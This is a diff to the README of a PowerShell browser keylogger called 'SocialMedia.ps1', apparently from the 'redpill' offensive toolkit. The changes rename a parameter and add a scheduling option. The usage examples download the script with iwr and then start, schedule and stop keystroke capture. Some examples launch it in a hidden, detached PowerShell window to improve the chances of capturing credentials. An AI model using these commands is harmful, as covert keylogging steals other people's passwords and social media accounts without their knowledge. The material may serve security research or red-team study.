@@ -342,10 +342,10 @@ Winget search games
 
 |Parameter|Description|value|Default value|
 |---|---|---|---|
-|Action|Start or Stop keylogger|Start, Stop|Start|
-|Delay|Milliseconds delay between loops|1300|1300|
+|Mode|Start or Stop keylogger|Start, Stop|Start|
+|Delay|Milliseconds delay between loops|1200|1200|
 |Force|Switch to bypass check: Is_Browser_Active?|Switch|Switch|
-|AutoDel|Switch that deletes this cmdlet in the end|Switch|Switch|
+|Schedule|Schedule cmdlet execution to: [HH:mm]|now|now|
 
 <br />
 
@@ -357,7 +357,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 **execute:**
 ```powershell
 ## Start browser keylogger capture
-.\SocialMedia.ps1 -action 'start'
+.\SocialMedia.ps1 -mode 'start'
 
 ## Use 5 seconds delay between each loop
 .\SocialMedia.ps1 -delay '5000'
@@ -366,8 +366,14 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
 .\SocialMedia.ps1 -force
 
 ## Stop keylogger and leak keystrokes on screen
-.\SocialMedia.ps1 -action 'stop'
+.\SocialMedia.ps1 -mode 'stop'
+
+## Schedule cmdlet capture to start at [HH:mm] hours
+.\SocialMedia.ps1 -schedule '02:34' -Mode 'start'
+
+## Schedule cmdlet capture to start at -shedule '[HH:mm]' hours and Bypass check: Is_Browser_Active?
+Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -schedule '02:34' -mode 'start' -force"
 
 ## Invoke SocialMedia cmdlet in a hidden windows console detach from parent process with the best chances (delay) of capture credentials
-Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -action 'start' -delay '200' -force -autodel" 
+Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -mode 'start' -delay '800' -force" 
 ```
